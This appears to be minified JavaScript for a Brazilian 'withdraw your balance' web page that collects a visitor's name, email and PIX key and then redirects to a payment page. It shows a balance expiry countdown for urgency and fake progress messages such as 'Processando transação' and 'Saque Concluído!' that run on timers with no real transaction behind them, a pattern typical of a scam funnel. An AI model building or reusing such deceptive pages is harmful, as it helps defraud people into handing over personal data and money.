import{r as O,i as W}from"./utm-helper-C4jEGc4L.js";import{p as H}from"./pix-preloader-tP1izpQF.js";document.getElementById("confirmation-button").addEventListener("click",function(g){g.preventDefault(),O("./iof.html")});W();(function(){let g=null,f=null;function h(e){const t=document.getElementById(e);if(!t)return;if(f=e,t.classList.add("is-modal","is-active"),t.removeAttribute("aria-hidden"),!document.body.classList.contains("modal-open")){const s=window.scrollY;document.body.style.position="fixed",document.body.style.top=`-${s}px`,document.body.style.width="100%",document.body.classList.add("modal-open"),document.documentElement.classList.add("modal-open")}if(e==="two"){const s=document.querySelector("#one .container-saldo .btn-sacar");s&&(s.removeAttribute("disabled"),s.style.pointerEvents="auto",s.style.opacity=""),setTimeout(()=>{const c=t.querySelector(".valor-currency[data-amount-target]");c&&typeof window.animateCurrencyCounter=="function"&&(c.textContent="R$ 0,00",window.animateCurrencyCounter(c,!0))},50)}function n(s){}t.addEventListener("click",n),t._overlayHandler=n;const i=Array.from(t.querySelectorAll("[data-modal-close]"));t._closeButtonHandlers=i.map(s=>{const c=o=>{o&&o.preventDefault(),m(e)};return s.addEventListener("click",c),{btn:s,h:c}});const r=t.querySelector('button, a, input, [tabindex]:not([tabindex="-1"])');r&&r.focus()}function m(e){const t=document.getElementById(e);if(!t)return;if(t._overlayHandler&&t.removeEventListener("click",t._overlayHandler),t._closeButtonHandlers&&t._closeButtonHandlers.forEach(({btn:r,h:s})=>r.removeEventListener("click",s)),t.classList.remove("is-active","is-modal"),t.setAttribute("aria-hidden","true"),document.querySelectorAll(".screen.is-modal.is-active").length===0){const r=document.body.style.top;document.body.style.position="",document.body.style.top="",document.body.style.width="",window.scrollTo(0,parseInt(r||"0")*-1),document.body.classList.remove("modal-open"),document.documentElement.classList.remove("modal-open")}f=null;const i=document.getElementById("one");if(i){const r=i.querySelector('button, a, input, [tabindex]:not([tabindex="-1"])');r&&r.focus()}}function l(){y(),g=setTimeout(()=>{const e=document.getElementById("one");e&&e.classList.contains("is-active")&&h("two")},0)}function y(){g&&(clearTimeout(g),g=null)}window.addEventListener("beforeunload",y);function w(e){const t=document.getElementById("timer"),n=document.getElementById("countdown-text");if(!t||!n)return;let i=e,r=setInterval(()=>{if(i<0){clearInterval(r),n.textContent="SEU SALDO EXPIROU";return}let s=Math.floor(i/60),c=i%60;t.textContent=`00 - ${String(s).padStart(2,"0")} - ${String(c).padStart(2,"0")}`,i--},1e3)}function I(e){const t=document.querySelectorAll(".expira-em-popup");t.length&&t.forEach((n,i)=>{const r=n.querySelector('[data-timer="minutes"]'),s=n.querySelector('[data-timer="seconds"]'),c=n.querySelector(".timer-label");if(!r||!s||!c)return;let o=e,a=setInterval(()=>{if(o<0){clearInterval(a),c.textContent="Expirado",r.textContent="00",s.textContent="00";return}let d=Math.floor(o/60),p=o%60;r.textContent=String(d).padStart(2,"0"),s.textContent=String(p).padStart(2,"0"),o--},1e3)})}let u={timeouts:[],interval:null};function S(){const e=document.getElementById("loading-text"),t=document.getElementById("progress-bar");!e||!t||(u.timeouts.forEach(n=>clearTimeout(n)),u.timeouts=[],u.interval&&(clearInterval(u.interval),u.interval=null),t.style.transition="none",t.style.width="0%",e.textContent="Iniciando...",e.style.opacity="1")}function B(){const e=document.getElementById("loading-text"),t=document.getElementById("progress-bar");if(!e||!t)return;S();const n=[{text:"Validando suas informações",progress:25},{text:"Concluindo saque",progress:50},{text:"Processando transação",progress:75},{text:"Finalizando",progress:100}],i=3e3,r=400,s=800;let c=0;t.offsetWidth,t.style.transition=`width ${i/1e3}s linear`;function o(){if(c<n.length){u.interval&&clearInterval(u.interval),e.style.opacity=0;const d=setTimeout(()=>{const p=n[c],v=p.text;e.textContent=v;const k=t.parentElement.offsetWidth-40;t.style.width=k*p.progress/100+"px",e.style.opacity=1;let x=0;u.interval=setInterval(()=>{x=x%3+1,e.textContent=v+".".repeat(x)},s),c++;const b=setTimeout(o,i);u.timeouts.push(b)},r);u.timeouts.push(d)}else{u.interval&&clearInterval(u.interval),e.style.opacity=0;const d=setTimeout(()=>{e.textContent="Saque Concluído!",e.style.opacity=1},r);u.timeouts.push(d)}}const a=setTimeout(o,500);u.timeouts.push(a)}window.startLoader=B,window.resetLoader=S;let E={interval:null,timeouts:[]};function L(){const e=document.getElementById("new-loading-text"),t=document.getElementById("new-progress-bar");if(!e||!t)return;_(),t.style.transition="width 1.3s ease-in-out";const n=["Validando dados...","Conectando ao servidor...","Concluindo resgate...","Quase pronto..."];e.textContent=n[0];let i=0;const r=n.length,s=100/r;function c(){const a=(i+1)*s;t.style.width=`${a}%`}c();function o(){e.style.opacity=0;const a=setTimeout(()=>{i++,e.textContent=n[i],e.style.opacity=1,c()},150);E.timeouts.push(a)}E.interval=setInterval(()=>{if(i>=r-1){clearInterval(E.interval);const a=setTimeout(()=>{typeof window.showScreen=="function"?window.showScreen("nine"):location.hash="#nine"},700);E.timeouts.push(a);return}o()},1600)}function _(){const e=document.getElementById("new-loading-text"),t=document.getElementById("new-progress-bar");E.interval&&(clearInterval(E.interval),E.interval=null),E.timeouts.forEach(n=>clearTimeout(n)),E.timeouts=[],e&&(e.textContent="Validando acesso...",e.style.opacity=1),t&&(t.style.transition="none",t.style.width="0%",t.offsetWidth,t.style.transition="width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)")}window.startNewLoadingAnimation=L,window.resetNewLoadingAnimation=_;function A(){let e=window.__formData;if(!e)try{const o=localStorage.getItem("userPixData");o&&(e=JSON.parse(o))}catch(o){console.error("Erro ao ler localStorage",o)}if(!e)return;function t(){const o=new Date,a=String(o.getDate()).padStart(2,"0"),d=String(o.getMonth()+1).padStart(2,"0"),p=o.getFullYear();return`${a}/${d}/${p}`}const n=document.getElementById("confirmation-name");n&&e.nome&&(n.textContent=e.nome);const i=document.getElementById("confirmation-email");i&&e.email&&(i.textContent=e.email);const r=document.getElementById("confirmation-date");r&&(r.textContent=t());const s=document.getElementById("confirmation-key-type");s&&e.tipoChave&&(s.textContent=e.tipoChave);const c=document.getElementById("confirmation-pix-key");if(c&&e.chavePix){let o=e.chavePix;if(e.tipoChave==="CPF"){if(!o.includes(".")&&!o.includes("-")){const a=o.replace(/\D/g,"");a.length===11&&(o=a.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"))}}else if(e.tipoChave==="Celular"){const a=o.replace(/\D/g,"");a.length>=10&&a.length<=11&&!o.includes("(")&&(a.length===11?o=a.replace(/(\d{2})(\d{5})(\d{4})/,"($1) $2-$3"):a.length===10&&(o=a.replace(/(\d{2})(\d{4})(\d{4})/,"($1) $2-$3")))}c.textContent=o}}window.fillConfirmationPage=A;function N(){const e=Array.from(document.querySelectorAll("#screens .screen"));if(!e.length)return;function t(i,r=!0){const s=document.getElementById(i);if(!s){console.warn(`Tela "${i}" não encontrada.`);return}if(e.forEach(o=>{o===s?(o.classList.add("is-active"),o.removeAttribute("aria-hidden")):(o.classList.remove("is-active"),o.setAttribute("aria-hidden","true"))}),r)try{history.pushState({screen:i},"","#"+i)}catch{location.hash=i}window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0,i==="nine"&&(window.scrollTo({top:0,left:0,behavior:"instant"}),document.documentElement.scrollTop=0,document.body.scrollTop=0,setTimeout(()=>{window.scrollTo({top:0,left:0,behavior:"instant"}),document.documentElement.scrollTop=0,document.body.scrollTop=0;const o=document.getElementById("nine");if(o){o.scrollTop=0;const a=o.querySelector(".confirmation-container");a&&(a.scrollTop=0)}},100));const c=s.querySelector('button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])');if(c&&c.focus({preventScroll:!0}),i==="one")l();else{y();const o=document.getElementById("popup-um");o&&o.classList.remove("is-visible"),i==="seven"?(["two","four","five","six"].forEach(d=>{const p=document.getElementById(d);p&&p.classList.contains("is-modal")&&m(d)}),typeof L=="function"&&L()):(typeof window.resetLoader=="function"&&window.resetLoader(),typeof _=="function"&&_(),f&&m(f))}i==="three"&&typeof window.animateCurrencyCounter=="function"&&(s._threeAnimationTimeout&&clearTimeout(s._threeAnimationTimeout),s._threeAnimationTimeout=setTimeout(()=>{const o=s.querySelector(".valor-currency[data-amount-target]");o&&s.classList.contains("is-active")&&window.animateCurrencyCounter(o,!0),s._threeAnimationTimeout=null},100)),i==="nine"&&(window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0,A(),setTimeout(()=>{window.scrollTo(0,0),document.documentElement.scrollTop=0,document.body.scrollTop=0;const o=document.getElementById("nine");o&&(o.scrollTop=0);const a=document.querySelector(".confirmation-balance-amount[data-amount-target]");a&&typeof window.animateCurrencyCounter=="function"&&window.animateCurrencyCounter(a,!0)},150))}window.addEventListener("popstate",i=>{const r=i.state&&i.state.screen||location.hash.replace("#","")||e[0].id;t(r,!1)});const n=location.hash.replace("#","")||e[0].id;t(n,!1),window.showScreen=t}document.addEventListener("DOMContentLoaded",()=>{const e=document.querySelector("#one .container-saldo .btn-sacar")||document.querySelector(".btn-sacar");e&&e.addEventListener("click",function(t){t.preventDefault(),typeof y=="function"&&y(),typeof m=="function"&&f&&m(f),H().catch(n=>{console.error("Erro ao pré-carregar PIX:",n)}),typeof window.showScreen=="function"?window.showScreen("three"):location.hash="#three"})}),document.addEventListener("DOMContentLoaded",()=>{N();const e=16*60+38;w(e),I(e),R(),(location.hash.replace("#","")||"one")==="one"&&l()});function R(){const e=document.querySelector("#one .saldo"),t=document.getElementById("popup-um"),n=document.getElementById("one");if(!e||!t||!n)return;const i=t.querySelector(".btn-sacar");i&&i.addEventListener("click",s=>{s.preventDefault(),typeof window.showScreen=="function"?window.showScreen("three"):location.hash="#three"});const r=new IntersectionObserver(s=>{s.forEach(c=>{!c.isIntersecting&&n.classList.contains("is-active")?t.classList.add("is-visible"):t.classList.remove("is-visible")})},{threshold:0,rootMargin:"-50px 0px 0px 0px"});r.observe(e),window.__stickyObserver=r}window.__spa_modal_helpers={schedulePopupForOne:l,clearModalTimer:y,showModal:h,closeModal:m},document.body.addEventListener("click",function(e){const t=e.target.closest("[data-modal-close]");if(!t)return;e.preventDefault();const n=t.closest(".screen"),i=n?n.id:"two";if(typeof m=="function")m(i);else if(window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.closeModal=="function")window.__spa_modal_helpers.closeModal(i);else{const r=document.getElementById(i);r&&(r.classList.remove("is-active","is-modal"),r.setAttribute("aria-hidden","true"),document.body.classList.remove("modal-open"))}}),document.body.addEventListener("click",function(e){const t=e.target.closest("[data-open-modal]");if(!t)return;const n=t.getAttribute("data-open-modal");if(n){if(e.preventDefault(),e.stopPropagation(),n==="six"){const i=document.getElementById("pix-selector-text");if(i){const r=i.textContent.trim(),c={CPF:"key-cpf","E-mail":"key-email",Celular:"key-celular","Chave Aleatória":"key-aleatoria"}[r];if(c){const o=document.getElementById(c);o&&(o.checked=!0)}}}typeof h=="function"?h(n):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.showModal=="function"&&window.__spa_modal_helpers.showModal(n)}}),document.body.addEventListener("keydown",function(e){if(e.key!=="Enter"&&e.key!==" ")return;const t=e.target.closest("[data-open-modal]");if(!t)return;const n=t.getAttribute("data-open-modal");n&&(e.preventDefault(),e.stopPropagation(),typeof h=="function"?h(n):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.showModal=="function"&&window.__spa_modal_helpers.showModal(n))});function $(e){if(e=e.replace(/[^\d]+/g,""),e.length!==11||/^(\d)\1+$/.test(e))return!1;let t=0,n;for(let i=1;i<=9;i++)t+=parseInt(e.substring(i-1,i))*(11-i);if(n=t*10%11,(n===10||n===11)&&(n=0),n!==parseInt(e.substring(9,10)))return!1;t=0;for(let i=1;i<=10;i++)t+=parseInt(e.substring(i-1,i))*(12-i);return n=t*10%11,(n===10||n===11)&&(n=0),n===parseInt(e.substring(10,11))}function C(e){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)}function P(e){const t=e.replace(/\D/g,"");return t.length>=10&&t.length<=11}function q(e){return/^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(e)}function T(){const e=document.getElementById("nome"),t=document.getElementById("email"),n=document.getElementById("pix-key-input"),i=document.getElementById("pix-selector-text"),r=document.getElementById("btn-enviar-pix");if(!e||!t||!n||!i||!r)return;const s=e.value.trim().length>0,c=C(t.value.trim()),o=i.textContent.trim(),a=o!=="Escolha o tipo de chave PIX",d=n.value.trim();let p=!1;if(a&&d.length>0)switch(o){case"CPF":p=$(d);break;case"E-mail":p=C(d);break;case"Celular":p=P(d);break;case"Chave Aleatória":p=q(d);break;default:p=d.length>0}s&&c&&a&&p?r.classList.remove("btn-disabled"):r.classList.add("btn-disabled")}const D=document.getElementById("nome");D&&D.addEventListener("input",T);const M=document.getElementById("email");M&&M.addEventListener("input",T),document.body.addEventListener("click",function(e){const t=e.target.closest("#six .option-row");if(!t)return;e.preventDefault(),e.stopPropagation();const n=t.querySelector(".option-text"),i=n?n.textContent.trim():"Chave",r=document.getElementById("pix-selector-text");r&&(r.textContent=i,r.style.color="#000");const s=document.getElementById("pix-key-input"),c=document.getElementById("pix-key-wrapper");s&&(s.value="",s.removeAttribute("disabled"),s.classList.remove("input-disabled"),s.focus()),c&&c.classList.remove("input-wrapper-disabled");const o=document.getElementById("pix-type-selector");o&&o.classList.remove("input-error","shake-animation"),T(),typeof m=="function"?m("six"):window.__spa_modal_helpers&&typeof window.__spa_modal_helpers.closeModal=="function"&&window.__spa_modal_helpers.closeModal("six")}),document.body.addEventListener("click",function(e){const t=e.target.closest("#pix-key-wrapper");if(t&&t.classList.contains("input-wrapper-disabled")){const n=document.getElementById("pix-type-selector");n&&(n.classList.remove("shake-animation","input-error"),n.offsetWidth,n.classList.add("input-error","shake-animation"),setTimeout(()=>{n.classList.remove("shake-animation")},500))}}),document.body.addEventListener("click",async function(e){const t=e.target.closest("#btn-enviar-pix");if(!t)return;if(e.preventDefault(),t.classList.contains("btn-disabled")){const o=document.getElementById("nome"),a=document.getElementById("email"),d=document.getElementById("pix-type-selector"),p=document.getElementById("pix-selector-text"),v=document.getElementById("pix-key-input");o&&o.value.trim()===""&&(o.classList.remove("shake-animation","input-error"),o.offsetWidth,o.classList.add("input-error","shake-animation"),setTimeout(()=>o.classList.remove("shake-animation"),500)),a&&!C(a.value.trim())&&(a.classList.remove("shake-animation","input-error"),a.offsetWidth,a.classList.add("input-error","shake-animation"),setTimeout(()=>a.classList.remove("shake-animation"),500));const k=p&&p.textContent.trim()!=="Escolha o tipo de chave PIX";if(!k&&d&&(d.classList.remove("shake-animation","input-error"),d.offsetWidth,d.classList.add("input-error","shake-animation"),setTimeout(()=>d.classList.remove("shake-animation"),500)),k&&v){const x=v.value.trim();let b=!1;switch(p.textContent.trim()){case"CPF":b=$(x);break;case"E-mail":b=C(x);break;case"Celular":b=P(x);break;case"Chave Aleatória":b=q(x);break;default:b=x.length>0}b||(v.classList.remove("shake-animation","input-error"),v.offsetWidth,v.classList.add("input-error","shake-animation"),v.focus(),setTimeout(()=>v.classList.remove("shake-animation"),500))}return}const n=document.getElementById("nome"),i=document.getElementById("email"),r=document.getElementById("pix-selector-text"),s=document.getElementById("pix-key-input"),c={nome:n?n.value.trim():"",email:i?i.value.trim():"",tipoChave:r?r.textContent.trim():"",chavePix:s?s.value.trim():""};window.__formData=c;try{localStorage.setItem("userPixData",JSON.stringify(c))}catch(o){console.error("Erro ao salvar no localStorage",o)}O("pagamento.html")});function V(e,t){if(!e)return"";if(t==="CPF")return e=e.replace(/\D/g,""),e.length>11&&(e=e.slice(0,11)),e.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");if(t==="Celular")return e=e.replace(/\D/g,""),e.length>11&&(e=e.slice(0,11)),e.length>10?e.replace(/^(\d\d)(\d{5})(\d{4}).*/,"($1) $2-$3"):e.length>6?e.replace(/^(\d\d)(\d{4})(\d{0,4}).*/,"($1) $2-$3"):e.length>2?e.replace(/^(\d\d)(\d{0,5})/,"($1) $2"):e.replace(/^(\d*)/,"($1");if(t==="Chave Aleatória"){e=e.replace(/[^0-9a-fA-F]/g,""),e.length>32&&(e=e.slice(0,32));let n="";return e.length>0&&(n+=e.slice(0,8)),e.length>8&&(n+="-"+e.slice(8,12)),e.length>12&&(n+="-"+e.slice(12,16)),e.length>16&&(n+="-"+e.slice(16,20)),e.length>20&&(n+="-"+e.slice(20,32)),n}return e}const F=document.getElementById("pix-key-input");F&&F.addEventListener("input",function(e){const t=document.getElementById("pix-selector-text");if(!t)return;const n=t.textContent.trim(),i=V(this.value,n);this.value!==i&&(this.value=i),T()})})();(function(){function g(){const h=document.querySelector("#three .botoes-row-sacar")||document.querySelector(".botoes-row-sacar");if(!h)return;const m=Array.from(h.querySelectorAll('button, [role="button"], a')),l=document.querySelector(".display-total");l&&m.push(l);const y="btn-active",w=document.querySelector(".btn-sacar-dois");w&&w.addEventListener("click",()=>{w.classList.contains("btn-sacar-indisponivel")||(typeof window.__spa_modal_helpers.showModal=="function"?window.__spa_modal_helpers.showModal("four"):showModal("four"))});function I(){m.forEach(u=>u.classList.remove(y))}m.forEach(u=>{u.addEventListener("click",()=>{I(),u.classList.add(y),w&&(w.classList.remove("btn-sacar-indisponivel"),w.removeAttribute("disabled"),w.style.pointerEvents="auto",w.style.opacity="1")})}),I()}function f(){g()}if(window.showScreen&&typeof window.showScreen=="function"){const h=window.showScreen;window.showScreen=function(m,l){h(m,l),String(m)==="three"&&setTimeout(f,30)}}else document.addEventListener("DOMContentLoaded",()=>{location.hash.replace("#","")==="three"&&setTimeout(f,30)});window.__spa_helpers=window.__spa_helpers||{},window.__spa_helpers.onShowThree=f})();(function(){const g="#three .valor-currency-dois[data-amount-target]";function f(l){return l.toLocaleString("pt-BR",{style:"currency",currency:"BRL"})}function h(l,y,w=1400){if(!l)return;const I=0,u=performance.now();function S(B){const E=Math.min(1,(B-u)/w),L=1-(1-E)*(1-E),_=I+(y-I)*L;l.textContent=f(_),E<1?requestAnimationFrame(S):l.textContent=f(y)}requestAnimationFrame(S)}function m(){const l=document.querySelector(g);if(!l)return;const y=l.getAttribute("data-amount-target"),w=parseFloat(y);isNaN(w)||(l.textContent=f(0),setTimeout(()=>h(l,w,1400),20))}document.addEventListener("DOMContentLoaded",()=>{const l=document.getElementById("three");l&&l.classList.contains("is-active")&&setTimeout(m,20)}),window.__countup=window.__countup||{},window.__countup.trigger=function(l){if(l){const y=document.querySelector(g);y&&(y.textContent=f(0))}m()}})();document.addEventListener("DOMContentLoaded",function(){setTimeout(()=>{if(window.showScreen){const g=window.showScreen;window.showScreen=function(f,h){g(f,h),f==="three"&&setTimeout(()=>{window.__spa_helpers&&window.__spa_helpers.onShowThree&&window.__spa_helpers.onShowThree()},30)}}},100)});
